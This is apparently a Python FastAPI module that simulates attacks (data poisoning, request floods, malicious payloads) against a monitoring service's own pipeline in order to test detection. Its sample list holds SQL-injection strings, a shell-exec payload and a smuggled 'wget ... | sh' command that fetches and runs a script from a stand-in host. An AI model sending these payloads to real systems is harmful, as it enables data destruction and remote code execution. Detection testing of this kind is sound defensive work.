"""Attack *simulator* for demos and detection testing. It only injects synthetic records into this
service's own in-memory pipeline; nothing is sent to any real device. Disable with
ENABLE_ATTACK_SIMULATOR=false."""
import random
from typing import Optional

from fastapi import APIRouter, HTTPException

from app.config import settings
from app.database import db
from app.engine.pipeline import QuarantinedError, ingest_fleet, ingest_water
from app.schemas.models import AttackResult, AttackTrigger, AttackType, FleetRecord, WaterRecord

router = APIRouter(prefix="/api/attack", tags=["attack-simulation"])

# Inert, textbook test strings (192/198.51.100.x are documentation-only address ranges).
_MALICIOUS_SAMPLES = [
    "'; DROP TABLE meter_readings;--",
    "1 UNION SELECT username, password FROM operators",
    '{"cmd":"exec(\'/bin/sh -c id\')"}',
    "reading=1; wget http://198.51.100.7/x.sh | sh",
    "A" * (settings.max_payload_bytes + 512),   # oversized payload
]


def _fleet_template(target_id: Optional[str]) -> FleetRecord:
    devices = {r.device_id: r for r in db.latest_fleet()}
    if not devices:
        raise HTTPException(status_code=409, detail="No fleet devices available.")
    if target_id:
        if target_id not in devices:
            raise HTTPException(status_code=404, detail=f"Unknown fleet device {target_id}.")
        return devices[target_id]
    candidates = [r for r in devices.values() if not db.is_quarantined(r.device_id)]
    return random.choice(candidates or list(devices.values()))


def _water_template(target_id: Optional[str]) -> WaterRecord:
    nodes = {r.node_id: r for r in db.latest_water()}
    if not nodes:
        raise HTTPException(status_code=409, detail="No water nodes available.")
    if target_id:
        if target_id not in nodes:
            raise HTTPException(status_code=404, detail=f"Unknown water node {target_id}.")
        return nodes[target_id]
    candidates = [r for r in nodes.values() if not db.is_quarantined(r.node_id)]
    return random.choice(candidates or list(nodes.values()))


def _packet(tpl: FleetRecord, rate: float, payload: str) -> FleetRecord:
    return FleetRecord(
        device_id=tpl.device_id, device_type=tpl.device_type, protocol=tpl.protocol, topic=tpl.topic,
        ip_address=tpl.ip_address, request_rate_hz=rate, payload=payload,
    )


@router.post("/trigger", response_model=AttackResult)
def trigger_attack(req: AttackTrigger):
    if not settings.enable_attack_simulator:
        raise HTTPException(status_code=403, detail="Attack simulator is disabled on this deployment.")

    injected = blocked = 0
    alert_ids: list[str] = []

    def push(fn, record) -> None:
        nonlocal injected, blocked
        try:
            _, alert = fn(record)
            injected += 1
            if alert and alert.alert_id not in alert_ids:
                alert_ids.append(alert.alert_id)
        except QuarantinedError:
            blocked += 1   # already isolated: the gateway drops these packets

    if req.attack_type == AttackType.DATA_POISONING:
        tpl = _water_template(req.target_id)
        target = tpl.node_id
        for i in range(req.intensity):
            # Falsified readings drifting progressively further out of range.
            push(ingest_water, WaterRecord(
                node_id=tpl.node_id, location=tpl.location, ip_address=tpl.ip_address,
                ph=min(14.0, round(9.4 + 0.5 * (i + 1), 2)),
                turbidity_ntu=32 + 6 * (i + 1),
                tds_ppm=1050 + 120 * (i + 1),
            ))
    else:
        tpl = _fleet_template(req.target_id)
        target = tpl.device_id
        for i in range(req.intensity):
            if req.attack_type == AttackType.DOS_FLOOD:
                push(ingest_fleet, _packet(tpl, round(random.uniform(120, 200) * req.intensity, 1), '{"hb":1}'))
            else:  # MALICIOUS_PAYLOAD
                push(ingest_fleet, _packet(tpl, 1.0, _MALICIOUS_SAMPLES[i % len(_MALICIOUS_SAMPLES)]))

    return AttackResult(
        attack_type=req.attack_type, target_id=target, injected=injected, blocked=blocked, alert_ids=alert_ids,
        message=f"{injected} synthetic records injected into {target}; {blocked} dropped (quarantined); "
                f"{len(alert_ids)} alert(s) raised.",
    )